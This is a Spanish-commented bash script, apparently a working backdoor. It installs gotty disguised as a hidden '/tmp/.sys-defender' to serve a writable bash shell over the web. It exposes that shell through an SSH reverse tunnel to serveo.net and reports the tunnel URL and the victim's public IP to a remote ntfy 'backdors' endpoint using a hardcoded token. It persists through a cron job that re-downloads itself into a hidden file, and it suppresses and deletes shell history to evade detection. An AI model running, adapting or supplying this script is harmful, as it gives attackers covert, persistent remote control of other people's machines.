#!/bin/bash

# Autor: insanerask
# Fecha: 2017-10-17

# Habilitar/deshabilitar depuración
DEBUG=OFF  # Cambiar a OFF para deshabilitar la depuración
SCRIPT_URL="https://raw.githubusercontent.com/insanerask77/scripts/refs/heads/main/sys-defender.sh"
# Función para imprimir mensajes de depuración
function debug {
    if [[ "$DEBUG" == "ON" ]]; then
        echo -e "\033[1;34m[DEBUG] $1\033[0m"  # Mensaje en azul
    fi
}

# Deshabilitar el historial para evitar que los comandos se registren
set +o history

# Función para instalar gotty en segundo plano
function install_gotty {
    debug "Instalando gotty..."
    if /tmp/.gotty -v > /dev/null 2>&1; then
        debug "Gotty ya está instalado."
    else
        wget -q https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz     
        tar -C /tmp -xzf gotty_linux_amd64.tar.gz > /dev/null 2>&1
        mv /tmp/gotty /tmp/.sys-defender
        rm -f gotty_linux_amd64.tar.gz > /dev/null 2>&1
        debug "Gotty instalado correctamente."
    fi   
}

# Llamar la función para instalar gotty
install_gotty   

# Función para iniciar gotty en segundo plano
function start_gotty {
    debug "Iniciando gotty..."
    if pgrep -f "/tmp/.sys-defender -p 6789 -w bash" > /dev/null 2>&1; then
        debug "Gotty ya está en ejecución."
    else
        # Usar 'nohup' y redirigir la salida estándar y los errores a /dev/null para que no se muestre nada
        nohup /tmp/.sys-defender -p 6789 -w bash -l > /dev/null 2>&1 &
        
        # Asegurarse de que el proceso se mantenga en segundo plano y no dependa de la terminal
        disown

        debug "Gotty iniciado en segundo plano."
    fi
}

# Llamar a la función para iniciar gotty
start_gotty

# Función para comprobar si la URL es válida
function is_url_active {
    local url="$1"
    debug "Comprobando la URL: $url"
    
    response=$(curl -o /dev/null -s -w "%{http_code}\n" "$url")
    debug "Respuesta del servidor: $response"
    
    if [[ "$response" == "200" ]]; then
        debug "La URL es válida."
        return 0  # La URL es válida
    elif [[ "$response" == "502" ]]; then
        debug "La URL no es válida (502)."
        return 1  # La URL no es válida (502)
    else
        debug "La URL devolvió un código inesperado: $response."
        return 1  # Cualquier otro código también se considera inválido
    fi
}

# Función para iniciar el túnel SSH y generar la URL
function start_ssh {
    LOGFILE=/tmp/.$((100000 + RANDOM % 900000)).log
    debug "Iniciando conexión SSH..."

    # Verificar si ya existe una conexión SSH activa
    if pgrep -f "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 serveo.net" > /dev/null 2>&1; then
        debug "La conexión SSH ya está activa. Comprobando URL..."

        # Encontrar el último archivo de log generado
        LAST_LOGFILE=$(ls -t /tmp/.*.log 2>/dev/null | head -n 1)

        if [[ -f "$LAST_LOGFILE" && -s "$LAST_LOGFILE" ]]; then
            URL=$(grep -o 'https://[0-9a-zA-Z\.]*' "$LAST_LOGFILE" | head -n 1)
            debug "Última URL obtenida: $URL"

            # Comprobar si la URL sigue activa
            if is_url_active "$URL"; then
                debug "La URL sigue activa. No se necesita reiniciar la conexión SSH."
                return  # Salir sin hacer nada
            else
                debug "La URL ya no es válida. Reiniciando conexión SSH..."
                kill -9 $(pgrep -f "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 serveo.net") > /dev/null 2>&1
            fi
        else
            debug "No se encontró un archivo de log válido."
        fi
    fi

    # Iniciar nueva conexión SSH
    nohup ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:6789 serveo.net > "$LOGFILE" 2>&1 &
    sleep 5
    debug "Conexión SSH iniciada."
    echo "$LOGFILE"
}

# Función para enviar el link generado
function send_link {
    LOGFILE=$(start_ssh)
    debug "Obteniendo URL del log..."

    # Encontrar el último archivo de log generado
    LAST_LOGFILE=$(ls -t /tmp/.*.log 2>/dev/null | head -n 1)

    # Verificar si el archivo de log existe y no está vacío
    if [[ -f "$LAST_LOGFILE" && -s "$LAST_LOGFILE" ]]; then
        URL=$(grep -o 'https://[0-9a-zA-Z\.]*' "$LAST_LOGFILE" | head -n 1)

        # Verificar si se obtuvo la URL
        if [[ -n "$URL" ]]; then
            debug "URL obtenida: $URL"
            # Obtener la IP pública del sistema
            IP=$(curl -s http://ipecho.net/plain)
            debug "IP pública: $IP"

            # Enviar la URL y la IP a través del servicio ntfy
            curl \
                -H "Authorization: Bearer tk_nuhhsh45e68n50f3etcv5dr0xnnq2" \
                -d "Nueva Conexión en: $URL desde IP: $IP" \
                https://ntfy.madolell.com/backdors > /dev/null 2>&1
            debug "Notificación enviada."
        else
            debug "No se pudo obtener la URL del log."
        fi
    else
        debug "El archivo de log no existe o está vacío."
    fi
}

# Llamar a la función para enviar el enlace
send_link

# Función para instalar una tarea cron para asegurar la persistencia
function install_cron {
    debug "Instalando tarea cron..."
    CRON_JOB="*/5 * * * * $HOME/.sys-update.sh"

    # Comprobar si el archivo del script existe
    if [[ ! -f "$HOME/.sys-update.sh" ]]; then
        debug "El archivo del script no existe. Instalando el script desde la URL."
        # Copiar el script actual a un archivo oculto en el directorio HOME
        curl -fsSL "$SCRIPT_URL" -o "$HOME/.sys-update.sh"
        chmod +x "$HOME/.sys-update.sh"
    else
        debug "El archivo del script ya existe."
    fi

    # Comprobar si la tarea cron ya está instalada
    if crontab -l 2>/dev/null | grep -q "$HOME/.sys-update.sh"; then
        debug "La tarea cron ya está instalada."
    else
        # Añadir una tarea cron que ejecute el script cada 30 minutos
        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
        debug "Tarea cron instalada."
    fi
}

# Llamar a la función para asegurar la persistencia mediante cron
install_cron

# Función para eliminar el historial de comandos recientes
function delete_history {
    LAST_ENTRY=$(history | tail -n 1 | awk '{print $1}')
    if [[ -n "$LAST_ENTRY" ]]; then
        history -d $LAST_ENTRY
        debug "Última entrada del historial eliminada."
    fi
}

# Llamar a la función para eliminar el historial
delete_history

# Restaurar el historial al final del script
set -o history
